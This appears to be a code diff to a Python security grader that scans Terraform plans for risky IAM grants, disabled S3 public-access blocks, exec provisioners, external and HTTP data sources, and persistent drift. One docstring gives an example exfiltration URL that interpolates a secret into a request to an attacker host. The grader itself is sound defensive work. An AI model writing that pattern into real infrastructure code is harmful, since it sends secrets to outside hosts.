@@ -211,6 +211,8 @@ def extract_iam_changes(plan: dict) -> list[IamChange]:
     """Pull IAM-affecting `resource_changes` out of a `terraform show -json` plan document."""
     out: list[IamChange] = []
     for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
+        if not isinstance(rc, dict):  # a hostile `[null]`/"x" entry must not crash the grader
+            continue
         rtype = rc.get("type", "")
         change = rc.get("change", {}) or {}
         after = (change.get("after") or {}) if isinstance(change.get("after"), dict) else {}
@@ -451,20 +453,21 @@ def _evaluate(ch: IamChange) -> list[tuple[str, Severity, str]]:
         hits.append(("CREDENTIAL_EXPOSURE", Severity.ERROR,
                      f"long-lived service-account key created at {ch.address}"))
 
-    # --- AWS S3 public-access-block being DISABLED or DELETED (re-exposes account/bucket-wide) ---
+    # --- AWS S3 public-access-block re-exposing the bucket account/bucket-wide ---
     if "public_access_block" in ch.rtype:
         flags = ("block_public_acls", "block_public_policy", "ignore_public_acls",
                  "restrict_public_buckets")
-        present = [f for f in flags if f in after]
-        # A pure DELETE (revoke) leaves `after` empty — REMOVING the PAB re-exposes the bucket exactly
-        # like flipping a flag to false, so it must gate too (round-7 F1, the guardrail-removal blind
-        # spot). A replace grades its new `after` via the flag check below.
+        # A PAB protects ONLY when all four flags are True. A DELETE (revoke) removes it; a
+        # create/update where any flag is False OR ABSENT (each defaults to false) leaves a gap. Both
+        # re-expose the bucket and must gate — gating only explicit-False missed the absent-flag and
+        # delete cases (round-6/round-7/round-8 F1: the guardrail-removal blind spot). Computed flags
+        # are already gated via UNKNOWN_IAM_CONTENT.
         if ch.change_type == "revoke":
             hits.append(("PUBLIC_ACCESS_BLOCK_DISABLED", Severity.ERROR,
                          f"S3 public-access-block deleted — protection removed at {ch.address}"))
-        elif present and any(after.get(f) is False for f in present):
+        elif not all(after.get(f) is True for f in flags):
             hits.append(("PUBLIC_ACCESS_BLOCK_DISABLED", Severity.ERROR,
-                         f"S3 public-access-block disabled at {ch.address}"))
+                         f"S3 public-access-block not fully enabled (flag false/absent) at {ch.address}"))
 
     # --- Network exposure: security-group open ingress ---
     if _open_ingress(after, ch.rtype):
@@ -592,7 +595,7 @@ def _k8s_rbac(ch: IamChange) -> list[tuple[str, Severity, str]]:
         # Only a CLUSTERROLE reference to the built-in name is the dangerous aggregated role; a user's
         # own namespaced Role happening to be named `edit`/`admin` is harmless (round-7 F6).
         if isinstance(ref, dict) and str(ref.get("name", "")).lower() in _RBAC_BUILTIN_ADMIN_ROLES \
-                and str(ref.get("kind", "")) == "ClusterRole":
+                and str(ref.get("kind", "")).lower() == "clusterrole":
             hits.append(("ADMIN_GRANT", Severity.ERROR,
                          f"built-in admin ClusterRole {ref.get('name')!r} bound at {ch.address}"))
     for subj in _as_list(after.get("subject")):
@@ -631,6 +634,8 @@ def plan_summary(plan: dict) -> dict[str, int]:
     """Count planned actions by kind — feeds the gateway escalation and the report summary."""
     counts = {"create": 0, "update": 0, "delete": 0, "replace": 0, "forget": 0, "no-op": 0}
     for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
+        if not isinstance(rc, dict):
+            continue
         a = set((rc.get("change") or {}).get("actions", []))
         if {"create", "delete"} <= a:
             counts["replace"] += 1
@@ -651,6 +656,8 @@ def destructive_changes(plan: dict) -> list[str]:
     """Addresses with a planned destroy or replace — the gateway escalates these to IRREVERSIBLE."""
     out: list[str] = []
     for rc in (plan.get("resource_changes", []) if isinstance(plan, dict) else []):
+        if not isinstance(rc, dict):
+            continue
         a = set((rc.get("change") or {}).get("actions", []))
         if "delete" in a:  # covers both delete and replace (create+delete)
             out.append(rc.get("address", ""))
@@ -660,37 +667,49 @@ def destructive_changes(plan: dict) -> list[str]:
 _EXEC_PROVISIONERS = {"local-exec", "remote-exec"}
 
 
-def provisioner_resources(plan: dict) -> list[str]:
-    """Addresses of resources that run an ARBITRARY program at apply/refresh whose side effects are
-    INVISIBLE to `resource_changes`/`after` — the canonical "clean plan, dirty apply". Covers a
-    local-exec/remote-exec PROVISIONER (round-6 P1) AND an `external` DATA SOURCE
-    (`data "external" { program = [...] }`, which runs every refresh — round-7 F5). Lives in the
-    plan's `configuration` block (not `resource_changes`), so it needs a separate walk; recurses
-    module calls."""
-    out: list[str] = []
-
-    def _walk(mod: object, prefix: str, depth: int) -> None:
+def _config_resources(plan: dict):
+    """Yield (full_address, resource_dict) for every resource in the plan's `configuration` block,
+    recursing module calls. The `configuration` tree holds provisioners / data-source programs that
+    never appear in `resource_changes` — the "clean plan, dirty apply/refresh" surface."""
+    def _walk(mod: object, prefix: str, depth: int):
         if depth > 20 or not isinstance(mod, dict):
             return
         for r in (mod.get("resources") or []):
-            if not isinstance(r, dict):
-                continue
-            provs = r.get("provisioners") or []
-            has_exec = any(isinstance(p, dict) and str(p.get("type", "")).lower() in _EXEC_PROVISIONERS
-                           for p in provs)
-            is_external = r.get("mode") == "data" and str(r.get("type", "")).lower() == "external"
-            if has_exec or is_external:
-                out.append(f"{prefix}{r.get('address', '')}")
+            if isinstance(r, dict):
+                yield f"{prefix}{r.get('address', '')}", r
         calls = mod.get("module_calls")
         if isinstance(calls, dict):
             for name, mc in calls.items():
                 sub = mc.get("module") if isinstance(mc, dict) else None
-                _walk(sub, f"{prefix}module.{name}.", depth + 1)
+                yield from _walk(sub, f"{prefix}module.{name}.", depth + 1)
 
     config = plan.get("configuration") if isinstance(plan, dict) else None
     root = (config or {}).get("root_module") if isinstance(config, dict) else None
-    _walk(root, "", 0)
+    yield from _walk(root, "", 0)
+
+
+def provisioner_resources(plan: dict) -> list[str]:
+    """Addresses of resources that run an ARBITRARY PROGRAM at apply/refresh whose side effects are
+    INVISIBLE to `resource_changes`/`after` — the canonical "clean plan, dirty apply". Covers a
+    local-exec/remote-exec PROVISIONER (round-6 P1) AND an `external` DATA SOURCE
+    (`data "external" { program = [...] }`, runs every refresh — round-7 F5). Gated ERROR/IRREVERSIBLE."""
+    out: list[str] = []
+    for addr, r in _config_resources(plan):
+        provs = r.get("provisioners") or []
+        has_exec = any(isinstance(p, dict) and str(p.get("type", "")).lower() in _EXEC_PROVISIONERS
+                       for p in provs)
+        is_external = r.get("mode") == "data" and str(r.get("type", "")).lower() == "external"
+        if has_exec or is_external:
+            out.append(addr)
     return out
+
+
+def http_data_sources(plan: dict) -> list[str]:
+    """Addresses of `data "http"` sources — they issue a GET at every plan/refresh and can EXFILTRATE
+    via URL interpolation (`url = "http://attacker/?t=${secret}"`) or SSRF. Lower-risk than an exec
+    program (GET only, and `http` has legitimate uses), so surfaced as an ADVISORY (round-8 F2)."""
+    return [addr for addr, r in _config_resources(plan)
+            if r.get("mode") == "data" and str(r.get("type", "")).lower() == "http"]
 
 
 def parse_terraform_plan(out: str, err: str = "") -> list[Issue]:
@@ -715,19 +734,35 @@ def parse_terraform_plan(out: str, err: str = "") -> list[Issue]:
             locator=addr, locator_precise=True,
             detail_json=json.dumps({"rule_id": "UNAUDITABLE_PROVISIONER", "address": addr}),
         ))
+    # A `data "http"` exfiltrates/SSRFs at refresh — advisory (WARNING), below the exec/external gate.
+    for addr in http_data_sources(plan):
+        issues.append(Issue(
+            kind=IssueKind.MISCONFIG, severity=Severity.WARNING, source=GraderKind.IAC,
+            message=f"{addr} is a data.http source — it fetches a URL at every refresh (exfil/SSRF risk)",
+            locator=addr, locator_precise=True,
+            detail_json=json.dumps({"rule_id": "HTTP_DATA_SOURCE", "address": addr}),
+        ))
     issues.extend(iam_risk_issues(extract_iam_changes(plan)))
     # Out-of-band live divergence terraform reports separately in `resource_drift` (state changed
-    # outside terraform). A manual admin grant matched by config shows NO resource_change — surface its
-    # IAM risk as ADVISORY (WARNING, non-gating) so it isn't silently clean (round-7 F2).
-    drift_plan = {"resource_changes": plan.get("resource_drift", [])} if isinstance(plan, dict) else {}
-    for ch in extract_iam_changes(drift_plan):
-        for rule_id, _sev, msg in _evaluate(ch):
+    # outside terraform). A drift whose address ALSO has a planned change may be reverted by the apply
+    # → advisory (WARNING). A drift with NO planned change means config already MATCHES the drifted
+    # reality, so the apply will NOT revert it — a manual admin grant that persists. Gate that at its
+    # real severity (round-7 F2 surfaced it; round-8 F4 makes the persistent case gate).
+    rc_list = plan.get("resource_changes", []) if isinstance(plan, dict) else []
+    changed = {rc.get("address", "") for rc in rc_list if isinstance(rc, dict)}
+    rd = plan.get("resource_drift", []) if isinstance(plan, dict) else []
+    for ch in extract_iam_changes({"resource_changes": rd if isinstance(rd, list) else []}):
+        persists = ch.address not in changed  # apply won't revert it
+        for rule_id, sev, msg in _evaluate(ch):
             issues.append(Issue(
-                kind=IssueKind.IAM_RISK, severity=Severity.WARNING, source=GraderKind.IAM,
-                message=f"[drift] {msg}", locator=ch.source_locus, locator_precise=True,
-                confidence=Confidence.MEDIUM,
+                kind=IssueKind.IAM_RISK, severity=(sev if persists else Severity.WARNING),
+                source=GraderKind.IAM,
+                message=f"[{'live, un-reverted' if persists else 'drift'}] {msg}",
+                locator=ch.source_locus, locator_precise=True,
+                confidence=(Confidence.HIGH if persists else Confidence.MEDIUM),
                 detail_json=json.dumps({"rule_id": rule_id, "address": ch.address, "drift": True,
-                                        "cloud": ch.cloud, "resource_type": ch.rtype}),
+                                        "persists": persists, "cloud": ch.cloud,
+                                        "resource_type": ch.rtype}),
             ))
     return issues
 
